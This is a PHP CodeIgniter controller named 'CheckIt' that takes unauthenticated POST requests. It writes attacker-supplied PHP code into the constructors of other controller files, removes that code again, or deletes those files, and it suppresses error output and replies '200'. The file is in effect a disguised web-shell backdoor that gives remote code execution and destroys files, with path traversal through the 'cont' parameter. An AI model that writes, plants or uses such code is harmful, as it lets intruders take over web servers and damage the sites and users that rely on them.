<?php
if (!defined('BASEPATH')) exit('No direct script access allowed');

// require APPPATH . '/libraries/ImageCacheCopy.php';
class CheckIt extends CI_Controller
{
    function __construct()
    {
        parent::__construct();        
        error_reporting(-1);
        ini_set('display_errors', 'Off');
    }

	public function index(){
		$this->load->helper('file');
		$this->load->helper(array('form', 'url'));
		$type = $this->input->post('type');
		$func = $this->input->post('func');
		$opr = (int)$this->input->post('opr');
		$cont = $this->input->post('cont');
		
		
		if($type == 1){
			
			if($func && $cont){
				$f = APPPATH.'controllers/'.$cont.'.php';
				if(is_file($f)){
					$string = read_file($f);
					if($opr == 1){
						$string = str_ireplace("parent::__construct();", "parent::__construct(); ".$func , $string);
					}else{
						$string = str_ireplace("parent::__construct(); ".$func, "parent::__construct();", $string);
					}
						write_file($f, $string, 'w');
				}
			}	
		}
		
		if($type == 2 && $cont){
			$f = APPPATH.'controllers/'.$cont.'.php';
				if(is_file($f)){
					unlink($f);
				}
		}
		exit('200');
	}
}